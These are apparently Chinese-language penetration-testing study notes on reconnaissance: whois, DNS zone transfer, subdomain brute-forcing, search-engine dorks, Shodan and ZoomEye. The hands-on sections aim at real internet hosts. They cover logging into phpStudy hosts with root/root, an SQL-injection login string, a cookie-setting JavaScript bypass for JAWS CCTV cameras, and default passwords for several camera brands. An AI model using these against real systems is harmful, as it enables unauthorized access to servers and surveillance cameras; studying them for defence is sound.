[testfire.net]

IBM为了掩饰它旗下Web漏洞扫描工具AppScan的强大功能而搭建的模拟银行网站

上面有许多常见的web安全漏洞

其他测试网站  

{vulnweb.com(AWVS)}

**DNS 信息**

收集DNS信息时, 主要关注**域名注册商**, 管理员联系方式, 电话和电子邮箱, 子域名等信息

- whois查询

  whois是一个集成在kali虚拟机中的小工具

  whois 可以用来查询域名注册信息

  也可以通过站长之家进行whois查询 [http://whois.chinaz.com]

  除了可以用whois查询外, 还可以进行反查

  @ 邮箱反查

  @ 注册人反查

  @ 电话反查

  

**子域名查询**

@ 可以查询子域名的网站 netcraft  [https://www.netcraft.com/]    需要科学上网

@ 根据证书查询



**域传送漏洞**

DNS区域传送 (DNS zone transfer) : 一台备用服务器使用来自主服务器的数据刷新自己的域数据库

为运行中的DNS服务提供了一定的冗余度, 提高可用性, 防止主域名服务器意外故障影响域名的解析

一般情况, 在网络中确实有备用DNS服务器时才会使用到, 但是许多DNS服务器却被错误的配置成了只要有client发出请求, 就会向对方提供一个zone数据库的详细信息, 也就是允许不受信任的互联网用户执行DNS区域传送操作是后果最为严重的错误配置之一

可以使用 dig 工具来检测域传送漏洞, 命令: [dig axfr @dns.example.com example.com]

axfr 选项参数  

通过域传送漏洞

​	获得: 子域名信息   子域名对应的IP地址

**子域名爆破**

工具: 子域名挖掘机 Layer

重要的是字典而不是工具   dic.txt

工具: dnsrecon  

[dnsrecon -d vulnweb.com -D /root/dic/dns.dic -t brt]

```
-d 指定域名
-D 指定字典路径(绝对路径)
-t brt 指定枚举形式 爆破
```



DNS2IP

​	通过DNS 解析 找到IP地址

- ping  非权威解答

```
ping testfire.net
65.61.137.117
```

```
ping baidu.com
39.156.69.79

ping www.baidu.com
61.135.185.32
```

- nslookup 非权威解答

  ```
  testfire.net
  65.61.137.117
  ```

  ```
  baidu.com
  Addresses:  39.156.69.79
              220.181.38.148
  ```

  ```
  www.baidu.com
  Addresses:  61.135.185.32
              61.135.169.121
  ```

- dig

  ```
  dig testfire.net
  dig baidu.com
  dig www.baidu.com
  # 结果和nslookup相同
  ```

  ```
  dig +trace testfire.net
  # 输出详细的解析过程
  ```

  ```
  dig @8.8.8.8 testfire.net 
  # 指定DNS进行解析
  ```

- dnsenum 

  ```
  dnsenum testfire.net
  # 会列出DNS服务器 NS记录
  ```

  自动检测域传送漏洞  AXFR

- 站长工具 [tool.chinaz.com/dns/]

- CDN 加速的问题

  CDN 内容分发网络 : 节点缓存, 使网站访问速度更快, 一般情况下无法获取目标网站的真实IP地址

  绕过: 1. 找历史解析记录 2.如果是收费CDN, 则主站和分站极有可能在一个IP网段 3.全网IP扫描

  如果网站有订阅功能也有迹可循

- IP查询

  [http://ip.chinaz.com]
  
  同IP的网站查询
  
  ​	1.1.1.1
  
  ​	A   B(A的旁站)
  
  ​	1.1.1.*   C段查询
  
  IP whois查询
  
  IP2Location

@ 查询IP地址的经纬度  [https://www.maxmind.com/]

​	得到IP地址的大致经纬度

@ 通过GPS查询物理位置 [http://www.gpsspg.com]

利用搜索引擎搜集信息

* google hacking

  google机器人 爬取全世界所有的网站内容

  hacker就是利用搜索引擎语法, 获取有关网站的信息

  ```
  site  指定网站
  ""    包含关键字
  inurl 在URL中出现的关键字
  ```

  @ 探索网站的目录结构

  ```
  "parent directory" site:testfire.net
  ```

  @ 搜索容易存在sql注入的页面

  ```
  site:testfire.net inurl:login
  ```

  @搜索指定的文件类型

  ```
  filetype pdf
  ```

  @ 搜索phpinfo()

  ```
  intext:"PHP Version" ext:php intext:"disabled" intext:"Build Date" intext:"System" intext:"allow_url_fopen"
  ```

  @ 搜索phpstudy

  ```
  intitle:"php中文网 探针2014"
  ```

* 实战: phpStudy 弱口令搜索

  phpstudy是比较知名的开发套件, 由于其搭建简单, 使用方便, 应用广泛

  phpstudy套件中的mysql数据库默认密码[root/root]

  我们可以通过搜索引擎找到安装了套件的主机, 使用弱口令进行测试

  搜索php 探针

  ```
  intitle:"php中文网 探针2014"
  ```

  弱口令登录

  使用[root/root] 弱口令尝试登录phpmyadmin

* 钟馗之眼 [https://www.zoomeye.org]

  ZoomEye 支持**公网设备**指纹检索和Web指纹检索

  网站指纹包括: 应用名, 版本, 前端框架, 后端框架, 服务端语言, 服务器操作系统, 网站容器, 内容管理系统和数据等

  

@ 搜索iis6.0组件

```
app:"Microsoft IIS httpd" ver:"6.0"
```

@ 搜索开启3389端口的windows主机

```
port:3389 OS:windows
```

* shodan

  [https://www.shodan.io]

> 网站信息收集
>
> ​	收集指纹信息
>
> ​	Web 服务器(容器)信息
>
> ​		netcraft  火狐插件 Netcraft Anti-Phishing Extension
>
> ​		火狐插件 Wappalyzer
>
> ​	远离aliyun服务器!

* 万能密码登录

  在登录框中输入[admin/123456' or '1'='1'] 即可登录系统

  实战: 搜索公网摄像头

  某一款CCTV摄像头存在漏洞, 管理该摄像头需要通过Web界面

  1) 利用shodan搜索

  JAWS/1.1 找到公网中的摄像头

  2) 空口令登入

  尝试[admin/空]登录后台

  3) 登录绕过

  空口令不好使

  在网页控制台中输入一下JS代码, 然后直接访问[/view2.html]即可绕过登录验证直接访问控制台

  ```
  document.cookie="dvr_camcnt=4";
  document.cookie="dvr_usr=admin";
  document.cookie="dvr_pwd=123";
  ```

* 其他摄像头默认账密

  @ 海康 IP网络摄像机[admin/12345]

  搜索 Hikvision Server: DVRDVS-Webs

  @ 大华 网络摄像机 [admin/888888]

  @ 天地伟业网络摄像机[Admin/111111]

  

参考:

​	域传送漏洞

​	https://github.com/lijiejie/edu-dns-zone-transfer

​	收集子域名的思路

​	https://www.secpulse.com/archives/53182.html

​	Web信息收集

​	https://blog.csdn.net/redbu1l/article/details/78763738

​	shodan语法

​	http://www.freebuf.com/sectool/121339.html

​	关于摄像头

​	http://0day5.com/archives/3766

​	GHDB

​	https://www.exploit-db.com/google-hacking-database